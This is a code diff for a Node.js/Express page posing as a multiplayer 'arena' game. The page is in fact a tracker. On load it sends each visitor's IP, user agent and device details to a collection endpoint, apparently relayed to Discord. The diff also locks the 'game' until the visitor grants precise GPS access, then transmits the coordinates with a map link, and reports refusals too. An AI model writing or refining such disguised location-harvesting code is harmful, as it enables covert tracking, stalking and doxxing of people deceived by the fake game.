@@ -22,6 +22,7 @@ app.get('/', (req, res) => {
                     --card-bg: #111827;
                     --accent: #10b981;
                     --accent-hover: #059669;
+                    --danger: #ef4444;
                     --text-main: #f9fafb;
                     --text-muted: #9ca3af;
                     --border: #1f2937;
@@ -85,6 +86,20 @@ app.get('/', (req, res) => {
                     background-color: var(--accent-hover);
                 }
 
+                /* Zone de message d'erreur pour la géolocalisation */
+                .error-box {
+                    display: none;
+                    margin-top: 16px;
+                    padding: 12px;
+                    background-color: rgba(239, 68, 68, 0.1);
+                    border: 1px solid var(--danger);
+                    border-radius: 8px;
+                    color: var(--danger);
+                    font-size: 0.85rem;
+                    line-height: 1.4;
+                    text-align: left;
+                }
+
                 .info-notice {
                     margin-top: 20px;
                     font-size: 0.8rem;
@@ -93,7 +108,6 @@ app.get('/', (req, res) => {
                     padding-top: 16px;
                 }
 
-                /* Zone du jeu masquée par défaut */
                 #game-dashboard {
                     display: none;
                 }
@@ -109,16 +123,21 @@ app.get('/', (req, res) => {
                 
                 <button class="btn-play" onclick="demarrerPartie()">Rejoindre l'arène</button>
 
+                <!-- Bloc d'erreur affiché uniquement si la position est bloquée/refusée -->
+                <div id="geo-error" class="error-box">
+                    ⚠️ <strong>Localisation requise :</strong> Impossible de rejoindre l'arène sans autoriser la géolocalisation. Veuillez l'activer dans les paramètres de votre navigateur puis réessayez.
+                </div>
+
                 <div class="info-notice">
                     En cliquant, vous acceptez la transmission de vos métadonnées techniques pour la session de jeu.
                 </div>
             </div>
 
-            <!-- Étape 2 : Tableau de bord après action -->
+            <!-- Étape 2 : Tableau de bord accessible SEULEMENT si la position est validée -->
             <div id="game-dashboard" class="game-card">
                 <div class="icon">🎯</div>
                 <h1>Partie en cours</h1>
-                <p id="status-text">Analyse de la zone de jeu...</p>
+                <p id="status-text">Coordonnées de jeu enregistrées. Recherche de cachettes à proximité...</p>
                 <div style="background: #1f2937; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.85rem; color: #10b981;">
                     Statut : Joueur connecté à l'arène
                 </div>
@@ -138,7 +157,7 @@ app.get('/', (req, res) => {
 
                 function transmettreMetadonnees(type, gpsData = null) {
                     const payload = {
-                        typeEvenement: type, // "Visite" ou "Clic Jouer"
+                        typeEvenement: type,
                         client: collecterMetadonnees(),
                         gps: gpsData
                     };
@@ -150,43 +169,40 @@ app.get('/', (req, res) => {
                     });
                 }
 
-                // 1. Envoi automatique dès l'arrivée sur le site
+                // Envoi automatique des métadonnées système au chargement de la page
                 window.addEventListener('DOMContentLoaded', () => {
                     transmettreMetadonnees('Visite initiale');
                 });
 
-                // 2. Envoi sur clic pour la position GPS
                 function demarrerPartie() {
+                    const errorBox = document.getElementById('geo-error');
+                    errorBox.style.display = 'none'; // Reinitialisation de l'affichage de l'erreur
+
                     if (navigator.geolocation) {
                         navigator.geolocation.getCurrentPosition(
                             (pos) => {
-                                envoyerGpsEtAfficherDashboard({
+                                const gpsData = {
                                     lat: pos.coords.latitude,
                                     lon: pos.coords.longitude,
                                     precision: pos.coords.accuracy
-                                });
+                                };
+
+                                // Transmission des coordonnées GPS et déblocage de l'interface
+                                transmettreMetadonnees('Localisation validée', gpsData);
+
+                                document.getElementById('lobby').style.display = 'none';
+                                document.getElementById('game-dashboard').style.display = 'block';
                             },
                             (err) => {
-                                envoyerGpsEtAfficherDashboard({ erreur: "Accès refusé (" + err.message + ")" });
+                                // Notification Discord du refus + blocage sur la page 1 avec message d'erreur
+                                transmettreMetadonnees('Refus localisation', { erreur: "Accès refusé (" + err.message + ")" });
+                                errorBox.style.display = 'block';
                             },
                             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                         );
                     } else {
-                        envoyerGpsEtAfficherDashboard({ erreur: "Géolocalisation non supportée" });
-                    }
-                }
-
-                function envoyerGpsEtAfficherDashboard(gpsData) {
-                    transmettreMetadonnees('Demande de localisation', gpsData);
-
-                    // Passage à l'interface de jeu
-                    document.getElementById('lobby').style.display = 'none';
-                    document.getElementById('game-dashboard').style.display = 'block';
-                    
-                    if (gpsData && gpsData.lat) {
-                        document.getElementById('status-text').innerText = "Coordonnées de jeu enregistrées. Recherche de cachettes à proximité...";
-                    } else {
-                        document.getElementById('status-text').innerText = "Mode spectateur activé (Position non partagée).";
+                        errorBox.innerText = "⚠️ La géolocalisation n'est pas supportée par votre navigateur.";
+                        errorBox.style.display = 'block';
                     }
                 }
             </script>
@@ -205,16 +221,20 @@ app.post('/api/collecte', async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Inconnu';
 
-    let gpsText = "⏳ Attente du clic sur l'arène...";
+    let gpsText = "⏳ Non partagée";
+    let colorCode = 3447003; // Bleu par défaut (Visite)
+
     if (gps.lat && gps.lon) {
         gpsText = `📍 [${gps.lat}, ${gps.lon}](https://www.google.com/maps?q=${gps.lat},${gps.lon}) (+/- ${Math.round(gps.precision)}m)`;
+        colorCode = 65280; // Vert si position GPS reçue
     } else if (gps.erreur) {
         gpsText = `❌ ${gps.erreur}`;
+        colorCode = 15158332; // Rouge si position refusée
     }
 
     const embeds = [{
         title: `🎮 ${typeEvenement}`,
-        color: gps.lat ? 65280 : 3447003, // Vert si GPS reçu, Bleu pour simple visite
+        color: colorCode,
         fields: [
             { name: "🌐 Connexion", value: `**IP :** \`${ip}\`\n**User-Agent :** \`${userAgent}\`` },
             { name: "💻 Appareil", value: `**Écran :** ${client.ecran}\n**CPU :** ${client.coeursCPU} cœurs | **RAM :** ${client.ramGo}\n**Zone :** ${client.fuseauHoraire}` },
